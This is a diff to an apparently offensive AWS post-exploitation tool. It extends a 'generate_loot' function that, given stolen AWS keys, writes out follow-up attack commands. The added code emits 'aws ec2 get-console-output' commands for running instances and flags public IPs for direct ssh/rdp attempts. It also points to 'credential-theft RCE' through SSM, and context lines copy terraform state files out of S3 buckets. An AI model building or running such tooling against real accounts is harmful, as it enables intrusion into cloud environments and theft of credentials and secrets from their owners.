@@ -1511,7 +1511,20 @@ def generate_loot(result, out_dir, account_id, key_id=None, secret=None, token=N
                 loot_lines.append(f"aws s3 cp s3://{b}/ ./{b}/ --recursive --include '*.tfstate'")
             loot_lines.append("")
 
-    # EC2 instances — SSM sessions
+    # EC2 instances
+    for region, ec2_data in result.get("ec2", {}).items():
+        if isinstance(ec2_data, dict) and ec2_data.get("running_instances"):
+            loot_lines.append(f"# ── EC2 Instances ({region}) ────────────────────────────")
+            for i in ec2_data["running_instances"]:
+                label = f"{i.get('name','')} | {i.get('type','')} | {i.get('private_ip','')}"
+                loot_lines.append(f"aws ec2 get-console-output --instance-id {i['id']} --region {region} --output text  # {label}")
+                if i.get("public_ip"):
+                    loot_lines.append(f"# Public IP {i['public_ip']} — direct connect (ssh/rdp/etc.) worth trying: {i['id']}")
+                if i.get("iam_profile"):
+                    loot_lines.append(f"# IAM profile attached: {i['iam_profile']} — see SSM section below for credential-theft RCE if managed")
+            loot_lines.append("")
+
+    # SSM sessions
     for region, ssm_data in result.get("ssm", {}).items():
         if isinstance(ssm_data, dict) and ssm_data.get("managed_instances"):
             loot_lines.append(f"# ── SSM Sessions ({region}) ──────────────────────────────")
